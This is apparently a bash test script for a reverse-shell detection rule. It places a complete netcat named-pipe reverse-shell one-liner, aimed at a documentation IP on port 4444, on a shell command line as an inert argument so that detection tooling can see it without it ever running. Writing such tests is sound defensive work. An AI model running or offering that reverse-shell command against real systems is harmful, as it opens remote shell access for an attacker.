#!/usr/bin/env bash
# Atomic test - rule 1adaaaca-bfcf-46fe-9bd1-4b475d7bc827
#   "Netcat or Socat Reverse Shell Execution"  (process_creation)
#
# Exercises the named-pipe relay branch (mkfifo ... | sh -i ... | nc host port).
# /bin/sh runs 'sleep 1; :' and receives the relay pipeline as one inert extra
# argument ($0), so the pipeline appears on the command line but never runs:
# no FIFO is created and nothing connects. The trailing ':' stops the shell
# tail-exec'ing into sleep, so it lives ~1s for /proc command-line enrichment.
set -u
timeout 3 /bin/sh -c 'sleep 1; :' \
  'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.1 4444 >/tmp/f' \
  >/dev/null 2>&1 || true
exit 0
